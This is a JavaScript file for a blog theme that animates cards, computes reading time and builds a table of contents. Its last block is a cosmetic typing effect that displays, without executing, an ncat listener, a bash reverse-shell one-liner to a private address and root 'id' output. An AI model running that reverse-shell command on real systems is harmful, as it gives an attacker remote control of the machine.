// === Razor Blog JS (clean) ===
(function(){
  function animateIn(nodeList, stagger){
    Array.from(nodeList).forEach((el, i)=>{
      el.style.animationDelay = (i*stagger)+'ms';
      el.classList.add('fx-enter');
    });
  }
  const cards = document.querySelectorAll('.grid .card');
  if(cards.length){ animateIn(cards, 40); }

  (function(){
    const container = document.querySelector('.post .post-body');
    if(!container) return;
    const words = container.textContent.trim().split(/\s+/).length;
    const rt = document.querySelector('[data-reading-time]');
    if(rt){ rt.textContent = Math.max(1, Math.round(words/220)) + ' min'; }
    const tocRoot = document.querySelector('.toc ul');
    if(tocRoot){
      tocRoot.innerHTML = "";
      const hs = container.querySelectorAll('h2, h3');
      hs.forEach((h, i)=>{
        if(!h.id){ h.id = (h.textContent.trim().toLowerCase().replace(/[^\w]+/g,'-') || 'sec') + '-' + i; }
        const li = document.createElement('li');
        li.className = 'level-' + h.tagName.toLowerCase();
        const a = document.createElement('a');
        a.href = '#' + h.id;
        a.textContent = h.textContent;
        li.appendChild(a);
        tocRoot.appendChild(li);
      });
    }
    animateIn(container.children, 20);
  })();

  (function(){
    const A = document.querySelector('[data-ty="a"]');
    const B = document.querySelector('[data-ty="b"]');
    if(!A || !B) return;
    const seqA = ["ncat -lvnp 4444","listening on [any] 4444 ...","connection received from 10.10.10.42","id","uid=0(root) gid=0(root) groups=0(root)"];
    const seqB = ["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"];
    function typeLine(el, str, delay){
      return new Promise(resolve=>{
        let i=0; (function step(){ if(i<str.length){ el.textContent+=str.charAt(i++); setTimeout(step, delay);} else { el.textContent+="\n"; resolve(); } })();
      });
    }
    async function run(){
      A.textContent=""; B.textContent="";
      await typeLine(A, seqA[0], 14);
      await typeLine(A, seqA[1], 10);
      await typeLine(B, seqB[0], 12);
      await typeLine(A, seqA[2], 12);
      await typeLine(A, seqA[3], 14);
      await typeLine(A, seqA[4], 10);
    }
    if(document.readyState==='loading'){ document.addEventListener('DOMContentLoaded', run); } else { run(); }
  })();
})();
